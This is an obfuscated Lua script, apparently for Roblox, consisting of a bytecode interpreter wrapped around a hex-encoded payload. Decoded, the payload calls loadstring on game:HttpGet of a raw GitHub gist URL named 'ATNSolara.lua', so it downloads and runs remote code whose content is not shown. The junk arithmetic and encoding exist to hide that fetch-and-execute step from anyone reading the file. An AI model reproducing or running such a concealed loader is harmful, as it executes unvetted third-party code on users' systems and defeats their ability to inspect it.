local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v86=0;local v87;while true do if (v86==0) then v87=v2(v0(v30,16));if v19 then local v121=v5(v87,v19);v19=nil;return v121;else return v87;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v88=(v31/(2^(v32-(2 -1))))%((5 -(880 -(282 + 595)))^(((v33-1) -(v32-(1 -0))) + (2 -1))) ;return v88-(v88%(620 -(555 + (1701 -(1523 + 114))))) ;else local v89=(837 + 94) -(857 + 74) ;local v90;while true do if (v89==(568 -(367 + 201))) then v90=(929 -(214 + 713))^(v32-(1 + 0)) ;return (((v31%(v90 + v90))>=v90) and (1 -0)) or (0 + 0) ;end end end end local function v21() local v34=1065 -(68 + 997) ;local v35;while true do if (v34==((282 + 989) -((1183 -(892 + 65)) + 1044))) then return v35;end if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + (118 -(32 + 85)) ;v34=1 + 0 ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + (4 -2) );v18=v18 + (3 -1) ;return (v37 * (469 -213)) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (353 -(87 + 263)) );v18=v18 + (184 -(67 + (449 -336))) ;return (v41 * (12302277 + 4474939)) + (v40 * (160901 -95365)) + (v39 * (189 + 67)) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=1 -0 ;local v45=(v20(v43,953 -(255 + 547 + 150) ,20) * ((5 -3)^32)) + v42 ;local v46=v20(v43,37 -(14 + 2) ,31);local v47=((v20(v43,24 + 8 )==(792 -(368 + 423))) and  -(3 -2)) or 1 ;if (v46==(997 -(915 + 82))) then if (v45==(772 -(201 + 571))) then return v47 * (0 -0) ;else v46=1 + 0 ;v44=0 -0 ;end elseif (v46==(3234 -(1069 + 118))) then return ((v45==(0 -0)) and (v47 * (1/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-(1461 -(145 + 293)) ) * (v44 + (v45/((1 + 1)^(1538 -(998 + (1626 -(116 + 1022))))))) ;end local function v25(v48) local v49;if  not v48 then v48=v23();if (v48==0) then return "";end end v49=v3(v16,v18,(v18 + v48) -(4 -3) );v18=v18 + v48 ;local v50={};for v66=1 + 0 , #v49 do v50[v66]=v2(v1(v3(v49,v66,v66)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=(function() return function(v91,v92,v93,v94,v95,v96,v97,v98) local v91=(function() return 675 -(534 + 141) ;end)();local v92=(function() return;end)();local v93=(function() return;end)();while true do if (v91~= #"[") then else if (v92== #"<") then v93=(function() return v94()~=(0 -0) ;end)();elseif (v92==(2 + 0)) then v93=(function() return v95();end)();elseif (v92== #"asd") then v93=(function() return v96();end)();end v97[v98]=(function() return v93;end)();break;end if (v91==0) then local v116=(function() return 1850 -(1409 + 441) ;end)();while true do if (v116==(0 -0)) then v92=(function() return v94();end)();v93=(function() return nil;end)();v116=(function() return 719 -(15 + 703) ;end)();end if (v116==1) then v91=(function() return  #"}";end)();break;end end end end return v91,v92,v93,v94,v95,v96,v97,v98;end;end)();local v52=(function() return function(v99,v100,v101) local v102=(function() return 0 + 0 ;end)();local v103=(function() return;end)();while true do if (v102~=0) then else v103=(function() return 0 -0 ;end)();while true do if (v103~=0) then else v99[v100-#"{" ]=(function() return v101();end)();return v99,v100,v101;end end break;end end end;end)();local v53=(function() return {};end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {v53,v54,nil,v55};end)();local v57=(function() return v23();end)();local v58=(function() return {};end)();for v68= #"~",v57 do FlatIdent_7126A,Type,Cons,v21,v24,v25,v58,v68=(function() return v51(FlatIdent_7126A,Type,Cons,v21,v24,v25,v58,v68);end)();end v56[ #"xxx"]=(function() return v21();end)();for v69= #"|",v23() do local v70=(function() return v21();end)();if (v20(v70, #"[", #"!")==(0 -0)) then local v107=(function() return 1721 -(345 + 1376) ;end)();local v108=(function() return;end)();local v109=(function() return;end)();local v110=(function() return;end)();while true do if (v107==(0 + 0)) then local v117=(function() return 0 + 0 ;end)();local v118=(function() return;end)();while true do if (v117==(688 -(198 + 490))) then v118=(function() return 0 -0 ;end)();while true do if (v118==(4 -3)) then v107=(function() return 1 + 0 ;end)();break;end if (v118==(0 -0)) then local v161=(function() return 0;end)();while true do if (v161==(0 -0)) then v108=(function() return v20(v70,1208 -(696 + 510) , #"91(");end)();v109=(function() return v20(v70, #"asd1",8 -2 );end)();v161=(function() return 1;end)();end if (v161~=(1 -0)) then else v118=(function() return 2 -1 ;end)();break;end end end end break;end end end if (v107~=(1263 -(1091 + 171))) then else local v119=(function() return 0;end)();while true do if (v119==(286 -(134 + 151))) then v107=(function() return 2;end)();break;end if (v119==(1665 -(970 + 695))) then v110=(function() return {v22(),v22(),nil,nil};end)();if (v108==(0 -0)) then local v157=(function() return 0;end)();local v158=(function() return;end)();while true do if (v157==(0 + 0)) then v158=(function() return 0 -0 ;end)();while true do if (v158==(0 -0)) then v110[ #"91("]=(function() return v22();end)();v110[ #".dev"]=(function() return v22();end)();break;end end break;end end elseif (v108== #",") then v110[ #"asd"]=(function() return v23();end)();elseif (v108==(6 -4)) then v110[ #"-19"]=(function() return v23() -((2 -0)^(60 -44)) ;end)();elseif (v108~= #"asd") then else local v176=(function() return 374 -(123 + 251) ;end)();local v177=(function() return;end)();while true do if (v176~=(0 -0)) then else v177=(function() return 0 -0 ;end)();while true do if (v177==(241 -(187 + 54))) then v110[ #"gha"]=(function() return v23() -((782 -(162 + 618))^(714 -(208 + 490))) ;end)();v110[ #".dev"]=(function() return v22();end)();break;end end break;end end end v119=(function() return 1 + 0 ;end)();end end end if (v107==(1 + 2)) then if (v20(v109, #"91(", #"19(")~= #"<") then else v110[ #"xnxx"]=(function() return v58[v110[ #"0313"]];end)();end v53[v69]=(function() return v110;end)();break;end if (v107~=(1 + 1)) then else if (v20(v109, #"!", #">")== #"|") then v110[2]=(function() return v58[v110[838 -(660 + 176) ]];end)();end if (v20(v109,2 -0 ,1 + 1 )== #"~") then v110[ #"91("]=(function() return v58[v110[ #"xxx"]];end)();end v107=(function() return 205 -(14 + 188) ;end)();end end end end for v71= #"}",v23() do v54,v71,v28=(function() return v52(v54,v71,v28);end)();end return v56;end local function v29(v60,v61,v62) local v63=v60[(5430 -3793) -(1117 + 256 + 263) ];local v64=v60[2];local v65=v60[3];return function(...) local v72=v63;local v73=v64;local v74=v65;local v75=v27;local v76=1001 -(451 + 549) ;local v77= -(1 + 0);local v78={};local v79={...};local v80=v12("#",...) -(1 -(0 -0)) ;local v81={};local v82={};for v104=1384 -(746 + 638) ,v80 do if (v104>=v74) then v78[v104-v74 ]=v79[v104 + 1 + 0 ];else v82[v104]=v79[v104 + (1 -0) ];end end local v83=(v80-v74) + (342 -(218 + 123)) ;local v84;local v85;while true do v84=v72[v76];v85=v84[1582 -(1535 + (111 -(30 + 35))) ];if ((v85<=(7 + 0)) or (1483==1830)) then if ((v85<=3) or (3082==3612)) then if (v85<=1) then if ((1432<3555) and (v85>0)) then v82[v84[1 + 1 ]]=v84[563 -(306 + 254) ];else local v128=v84[1 + 1 ];v82[v128]=v82[v128](v13(v82,v128 + 1 ,v77));end elseif ((2460<=3134) and (v85==(3 -(1 + 0)))) then v82[v84[1469 -(899 + 568) ]]=v84[2 + 1 ]~=(0 -0) ;else v82[v84[605 -(268 + (1592 -(1043 + 214))) ]]=v84[293 -(60 + 230) ]~=(572 -(426 + 146)) ;end elseif ((v85<=(1 + 4)) or (1065>3578)) then if (v85>(1460 -(282 + 1174))) then local v132=(3066 -2255) -(569 + 242) ;local v133;local v134;local v135;local v136;while true do if (v132==(0 -0)) then v133=v84[1214 -(323 + 889) ];v134,v135=v75(v82[v133](v13(v82,v133 + 1 ,v84[3])));v132=1 + 0 ;end if ((v132==(1025 -(706 + 318))) or (4795<1407)) then v77=(v135 + v133) -(1252 -((1940 -1219) + 530)) ;v136=1271 -(945 + 326) ;v132=4 -2 ;end if (v132==(2 + 0)) then for v169=v133,v77 do local v170=0;while true do if (v170==(700 -(271 + 429))) then v136=v136 + 1 + 0 ;v82[v169]=v134[v136];break;end end end break;end end else local v137=v84[1502 -(1408 + 92) ];local v138=v82[v84[1089 -(461 + 625) ]];v82[v137 + ((1869 -(361 + 219)) -(993 + 295)) ]=v138;v82[v137]=v138[v84[1 + 3 ]];end elseif (v85==6) then do return;end else do return;end end elseif (v85<=(1182 -(418 + 753))) then if (v85<=(4 + 5)) then if (v85>(1 + (327 -(53 + 267)))) then v82[v84[2]]=v84[1 + 2 ];else local v144=v84[1 + 1 ];v82[v144]=v82[v144](v13(v82,v144 + ((120 + 410) -((819 -(15 + 398)) + 123)) ,v77));end elseif (v85>10) then v82[v84[2]]();else v82[v84[1771 -(1749 + 20) ]]();end elseif ((v85<=13) or (3275>=4794)) then if ((1853<4813) and (1484==1484) and (v85==12)) then local v146=0 + 0 ;local v147;local v148;while true do if ((v146==(1323 -(1249 + 73))) or (2821<2431)) then v82[v147 + (983 -(18 + 964)) + 0 ]=v148;v82[v147]=v148[v84[1149 -(466 + (2555 -1876)) ]];break;end if ((0 -0)==v146) then v147=v84[5 -(2 + 1) ];v148=v82[v84[1903 -(106 + 1794) ]];v146=1 + 0 ;end end else v82[v84[1 + 1 ]]=v62[v84[8 -5 ]];end elseif ((v85==14) or (2874<2181)) then v82[v84[5 -3 ]]=v62[v84[117 -(4 + 110) ]];else local v153=v84[586 -(57 + 527) ];local v154,v155=v75(v82[v153](v13(v82,v153 + 1 + 0 ,v84[1430 -(41 + 1386) ])));v77=(v155 + v153) -(104 -(17 + 86)) ;local v156=(850 -(20 + 830)) + 0 ;for v159=v153,v77 do local v160=0 -(0 + 0) ;while true do if (v160==(0 -0)) then v156=v156 + (167 -(122 + (170 -(116 + 10)))) ;v82[v159]=v154[v156];break;end end end end v76=v76 + (1 -0) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403873Q00682Q7470733A2Q2F676973742E67697468756275736572636F6E74656E742E636F6D2F626C2Q654Q682F65363334632Q3063326133312Q362Q392Q6330343135643136323163353665372F7261772F376136306366303835643537663539613463323933653366386365343234383735346538373865632F41544E536F6C6172612E6C756100093Q00120E3Q00013Q00120E000100023Q002004000100010003001201000300044Q0002000400014Q000F000100044Q00085Q00022Q000A3Q000100012Q00063Q00017Q00",v9(),...);
